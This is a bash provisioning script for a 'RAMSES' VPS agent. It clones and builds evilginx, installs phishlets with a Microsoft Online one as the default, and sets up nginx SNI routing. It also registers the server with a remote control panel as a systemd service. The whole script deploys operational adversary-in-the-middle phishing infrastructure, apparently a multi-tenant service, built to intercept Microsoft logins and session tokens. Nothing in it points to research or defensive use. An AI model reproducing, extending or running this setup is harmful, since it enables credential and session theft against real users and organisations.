#!/usr/bin/env bash
# RAMSES VPS agent bootstrap (Ubuntu 22.04 / 24.04, x86_64).
#
# Idempotent: safe to re-run. Registers the box with the control plane via
# heartbeats, installs the agent under systemd, and verifies it comes online.
#
# Usage:
#   sudo ./vps-bootstrap.sh \
#       CONTROL_URL=https://app.ramses-panel.xyz/api \
#       AGENT_SECRET=<one-time secret shown when the VPS was registered> \
#       AGENT_VPS_ID=<vps-uuid from the admin panel> \
#       EVILGINX_SRC=/opt/evilginx-src
#
# Required envs: CONTROL_URL, AGENT_SECRET, AGENT_VPS_ID
# Optional:     EVILGINX_BIN (prebuilt binary path) instead of EVILGINX_SRC
#               EVILGINX_GIT_URL (auto-clone if no SRC/BIN given, default: https://github.com/grahmbell01/ginx.git)
#               AGENT_HTTPS_PORT (default 443), AGENT_DNS_PORT (default 5302)
#               LABEL (friendly name for systemd unit)
set -euo pipefail

CONTROL_URL="${CONTROL_URL:-}"
AGENT_SECRET="${AGENT_SECRET:-}"
AGENT_VPS_ID="${AGENT_VPS_ID:-}"
EVILGINX_SRC="${EVILGINX_SRC:-}"
EVILGINX_BIN="${EVILGINX_BIN:-}"
EVILGINX_GIT_URL="${EVILGINX_GIT_URL:-https://github.com/grahmbell01/ginx.git}"
AGENT_HTTPS_PORT="${AGENT_HTTPS_PORT:-443}"
AGENT_DNS_PORT="${AGENT_DNS_PORT:-5302}"
LABEL="${LABEL:-ramses-agent}"
REPO_DIR="${REPO_DIR:-/opt/ramses/repo}"
VENV_DIR="${VENV_DIR:-/opt/ramses/venv}"
AGENT_DIR="${AGENT_DIR:-/opt/ramses/agent}"
ENV_FILE="${ENV_FILE:-/etc/ramses/agent.env}"
EVG_ROOT="${EVG_ROOT:-/opt/evilginx}"
EVG_DIST="${EVG_DIST:-/opt/evilginx/dist}"
NGINX_STREAM_DIR="${NGINX_STREAM_DIR:-/etc/nginx/stream.conf.d}"

if [[ -z "$CONTROL_URL" || -z "$AGENT_SECRET" || -z "$AGENT_VPS_ID" ]]; then
    echo "ERROR: CONTROL_URL, AGENT_SECRET and AGENT_VPS_ID are required" >&2
    echo "Register the box in the admin panel first (POST /admin/vps or the VPS page)." >&2
    exit 1
fi

if [[ -z "$EVILGINX_SRC" && -z "$EVILGINX_BIN" ]]; then
    echo "==> No EVILGINX_SRC or EVILGINX_BIN provided — cloning from $EVILGINX_GIT_URL"
    EVILGINX_SRC="/opt/evilginx-src"
    if [[ -d "$EVILGINX_SRC/.git" ]]; then
        echo "==> Existing source at $EVILGINX_SRC — pulling latest"
        git -C "$EVILGINX_SRC" pull --ff-only 2>/dev/null || \
            git -C "$EVILGINX_SRC" pull --allow-unrelated-histories --ff-only 2>/dev/null || true
    else
        git clone "$EVILGINX_GIT_URL" "$EVILGINX_SRC"
    fi
fi

echo "==> Step 1/6  system packages"
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y python3 python3-venv nginx iproute2 curl ca-certificates build-essential
apt-get install -y libnginx-mod-stream || true
# Remove package conf that causes duplicate load — we inject our own
rm -f /etc/nginx/modules-enabled/50-mod-stream.conf
sed -i '/load_module.*ngx_stream_module/d' /etc/nginx/nginx.conf
# Add load_module once at top (needed for dynamic module)
if [[ -f /usr/lib/nginx/modules/ngx_stream_module.so ]]; then
    sed -i '1i load_module /usr/lib/nginx/modules/ngx_stream_module.so;' /etc/nginx/nginx.conf
fi
if [[ -f /usr/lib/nginx/modules/ngx_stream_ssl_preread_module.so ]]; then
    if ! grep -q "ngx_stream_ssl_preread_module.so" /etc/nginx/nginx.conf; then
        sed -i '1i load_module /usr/lib/nginx/modules/ngx_stream_ssl_preread_module.so;' /etc/nginx/nginx.conf
    fi
fi

echo "==> Step 2/6  evilginx binary + phishlets"
mkdir -p "$EVG_DIST/phishlets"
if [[ -n "$EVILGINX_SRC" ]]; then
    if ! command -v go >/dev/null; then
        apt-get install -y golang-go
    fi
    pushd "$EVILGINX_SRC" >/dev/null
    go build -o "$EVG_DIST/evilginx" .
    popd >/dev/null
    # microsoft-online.yaml is what the control plane provisions by default today
    cp "$EVILGINX_SRC"/phishlets/*.yaml "$EVG_DIST/phishlets/" 2>/dev/null || true
    cp "$EVILGINX_SRC/fingerprint.js" "$EVG_DIST/phishlets/fingerprint.js" 2>/dev/null || true
    cp -r "$EVILGINX_SRC/redirectors" "$EVG_DIST/redirectors" 2>/dev/null || true
else
    cp "$EVILGINX_BIN" "$EVG_DIST/evilginx"
    # phishlets for a prebuilt binary must be laid out by the operator under $EVG_DIST/phishlets
fi
[[ -x "$EVG_DIST/evilginx" ]] || { echo "ERROR: evilginx binary missing at $EVG_DIST/evilginx" >&2; exit 1; }
[[ -f "$EVG_DIST/phishlets/microsoft-online.yaml" ]] || \
    echo "WARN: microsoft-online.yaml not found under $EVG_DIST/phishlets — provisioning will fail"

echo "==> Step 3/6  agent runtime"
mkdir -p /opt/ramses /etc/ramses "$NGINX_STREAM_DIR"
mkdir -p "$(dirname "$ENV_FILE")"
if [[ ! -d "$VENV_DIR" ]]; then
    python3 -m venv "$VENV_DIR"
fi
"$VENV_DIR/bin/pip" install --quiet --upgrade pip
"$VENV_DIR/bin/pip" install --quiet httpx

AGENT_SRC=""
if [[ -d "$EVILGINX_SRC/agent" ]]; then
    AGENT_SRC="$EVILGINX_SRC/agent"
elif [[ -d "$REPO_DIR/agent" ]]; then
    AGENT_SRC="$REPO_DIR/agent"
fi
if [[ -n "$AGENT_SRC" ]]; then
    rm -rf "$AGENT_DIR"
    cp -r "$AGENT_SRC" "$AGENT_DIR"
else
    echo "WARN: no agent code found — keeping existing $AGENT_DIR if present"
fi
[[ -d "$AGENT_DIR" ]] || { echo "ERROR: agent code missing (expected at $AGENT_DIR)" >&2; exit 1; }

echo "==> Step 4/6  nginx: top-level stream include (agent writes SNI map here)"
if ! grep -q "include $NGINX_STREAM_DIR/\*.conf;" /etc/nginx/nginx.conf; then
    sed -i "s#^}\$#}\n\nstream {\n    include $NGINX_STREAM_DIR/*.conf;\n}#" /etc/nginx/nginx.conf
fi

# Disable the default site so it does not bind 0.0.0.0:80 (which would block
# evilginx's autocert ACME listener on 127.0.0.2:80). The agent writes its own
# http config into /etc/nginx/conf.d/ (already covered by the *.conf glob)
# which binds port 80 to the external IP only.
if [[ -f /etc/nginx/sites-enabled/default ]]; then
    rm -f /etc/nginx/sites-enabled/default
fi
nginx -t || { echo "ERROR: nginx config test failed" >&2; exit 1; }
systemctl enable --now nginx

echo "==> Step 5/6  systemd unit + env"
umask 077
cat > "$ENV_FILE" <<EOF
CONTROL_URL=$CONTROL_URL
AGENT_SECRET=$AGENT_SECRET
AGENT_VPS_ID=$AGENT_VPS_ID
EVILGINX_BIN=$EVG_DIST/evilginx
PHISHLETS_DIR=$EVG_DIST/phishlets
AGENT_HTTPS_PORT=$AGENT_HTTPS_PORT
AGENT_DNS_PORT=$AGENT_DNS_PORT
AGENT_DATA_ROOT=/opt/evilginx/users
AGENT_CONFIG_ROOT=/opt/evilginx/users
AGENT_STATE_FILE=/opt/evilginx/agent-state.json
NGINX_CONF=$NGINX_STREAM_DIR/evilginx-sni.conf
NGINX_APPLY=1
LOOPBACK_APPLY=1
EOF

cat > /etc/systemd/system/$LABEL.service <<EOF
[Unit]
Description=RAMSES VPS agent
After=network-online.target nginx.service
Wants=network-online.target

[Service]
Type=simple
EnvironmentFile=$ENV_FILE
WorkingDirectory=$(dirname "$AGENT_DIR")
ExecStart=$VENV_DIR/bin/python -m agent.main
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now "$LABEL"

echo "==> Step 6/6  verify"
sleep 6
systemctl --no-pager -l status "$LABEL" --no-pager | head -n 12 || true
journalctl -u "$LABEL" -n 10 --no-pager || true
echo
echo "Agent installed. Open the admin panel -> VPS page and confirm '$AGENT_VPS_ID' flips to"
echo "online (heartbeats every ~5s). If it stays offline, check:"
echo "   journalctl -u $LABEL -f"
echo "   curl -s -X POST $CONTROL_URL/agent/heartbeat -H 'X-Agent-Secret: \$AGENT_SECRET' -H 'X-Agent-Vps: $AGENT_VPS_ID'"